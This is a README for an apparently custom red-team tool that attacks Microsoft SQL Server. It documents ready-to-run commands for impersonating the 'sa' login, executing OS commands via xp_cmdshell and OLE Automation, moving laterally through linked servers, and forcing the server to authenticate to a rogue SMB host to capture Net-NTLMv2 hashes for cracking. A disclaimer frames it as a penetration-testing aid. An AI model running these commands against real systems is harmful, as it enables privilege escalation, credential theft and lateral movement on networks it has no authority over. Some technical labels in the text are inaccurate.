# **MSSQL Custom Red Team Tool**

## **Overview**
The **MSSQL Custom Red Team Tool** is a command-line utility designed for security assessments and penetration testing of Microsoft SQL Server environments. It enables testers to perform **SQL enumeration, impersonation, command execution, and linked server attacks** using various MSSQL techniques.

This tool supports **SQL authentication bypass techniques** such as `xp_cmdshell`, `sp_oacreate` (OLE Automation), and **linked server exploitation**.

---

## **Features**
- **SQL User Enumeration** (`-enum`): Lists the current user and role membership.
- **Impersonation Attacks** (`-impersonate <user>`): Switch execution context to another user.
- **List Impersonatable Users** (`-list-impersonate`): Identify users that can be impersonated.
- **Command Execution via xp_cmdshell** (`-executexpcmd <command>`): Execute system commands via SQL Server.
- **Command Execution via OLE Automation** (`-executeole <command>`): Execute system commands using `sp_oacreate`.
- **Linked Server Enumeration** (`-list-linkedservers`): List available linked servers.
- **Linked Server Command Execution** (`-linked-server <server> <command>`): Execute commands on linked servers.
- **Triggering UNC Path Exposure via xp_dirtree** (`-xp-dirtree <UNC path>`): Exploit **Net-NTLM Hash Leaks**.

---

## **Usage**
### **Basic Authentication**
To run the tool, specify **SQL Server and Database**:
```sh
SQLTool.exe -server <SQL Server> -database <Database>
```
Example:
```sh
SQLTool.exe -server dc01.corp1.com -database master
```
If authentication is successful, the tool allows further command execution.

---

## **Available Commands**
### **1️⃣ Enumeration**
- **Enumerate SQL Users and Roles**
  ```sh
  SQLTool.exe -server dc01.corp1.com -database master -enum
  ```
  **Example Output:**
  ```
  Logged in as: corp1\SQLSvc
  Public role membership status: 1
  ```

### **2️⃣ Impersonation**
- **List Users That Can Be Impersonated**
  ```sh
  SQLTool.exe -server dc01.corp1.com -database master -list-impersonate
  ```
  **Example Output:**
  ```
  Users that can be impersonated:
   - sa
   - securityadmin
  ```

- **Impersonate Another User**
  ```sh
  SQLTool.exe -server dc01.corp1.com -database master -impersonate sa
  ```
  **Example Output:**
  ```
  Attempting to impersonate: sa
  Current user after impersonation: sa
  ```

---

### **3️⃣ Command Execution**
#### **Execute Commands via `xp_cmdshell`**
- **Run `whoami` using `xp_cmdshell`**
  ```sh
  SQLTool.exe -server dc01.corp1.com -database master -executexpcmd "whoami"
  ```
  **Example Output:**
  ```
  Enabling and executing xp_cmdshell: whoami
  Command output:
  corp1\SQLSvc
  ```

- **Run `ipconfig` using `xp_cmdshell`**
  ```sh
  SQLTool.exe -server dc01.corp1.com -database master -executexpcmd "ipconfig"
  ```

#### **Execute Commands via `sp_oacreate` (OLE Automation)**
- **Run `whoami` using `sp_oacreate`**
  ```sh
  SQLTool.exe -server dc01.corp1.com -database master -executeole "whoami"
  ```
  **Example Output:**
  ```
  Enabling and executing OLE Automation Procedures: whoami
  Command executed via OLE Automation: whoami
  ```

- **Run `ipconfig` using `sp_oacreate`**
  ```sh
  SQLTool.exe -server dc01.corp1.com -database master -executeole "ipconfig"
  ```

---

### **4️⃣ Linked Server Exploitation**
- **List Available Linked Servers**
  ```sh
  SQLTool.exe -server dc01.corp1.com -database master -list-linkedservers
  ```
  **Example Output:**
  ```
  Available Linked Servers:
   - APPSRV01
   - FILESRV02
  ```

- **Execute a Command on a Linked Server**
  ```sh
  SQLTool.exe -server dc01.corp1.com -database master -linked-server APPSRV01 "whoami"
  ```
  **Example Output:**
  ```
  Executing commands on linked server: APPSRV01...
  Command output from APPSRV01 (whoami):
  corp1\SQLSvc
  ```

---

### **5️⃣ Hash Extraction via `xp_dirtree`**
- **Trigger SMB Hash Leak Using `xp_dirtree`**
  ```sh
  SQLTool.exe -server dc01.corp1.com -database master -xp-dirtree "\\192.168.45.189\test"
  ```
  This technique forces the SQL Server to attempt SMB authentication to a rogue server, allowing an attacker to capture **Net-NTLMv2 hashes** for offline cracking.

---

## **Installation**
1. **Compile the Code**
   - Open the project in **Visual Studio**.
   - Set the build mode to **Release**.
   - Click **Build** → **Build Solution**.

2. **Run the Executable**
   - The compiled executable will be in:
     ```
     bin\x64\Debug\SQLTool.exe
     ```
   - Execute commands as needed.

---

## **How It Works**
This tool:
✅ **Connects to a SQL Server instance.**  
✅ **Authenticates using Windows Integrated Security.**  
✅ **Executes various SQL and OS commands via SQL Server.**  
✅ **Supports impersonation for privilege escalation.**  
✅ **Performs lateral movement via linked servers.**  

---

## **Disclaimer**
This tool is intended for **legal penetration testing, security assessments, and red team operations**.  
**Unauthorized use against systems without explicit permission is illegal and punishable by law.**  

**Happy Hacking! 🚀**

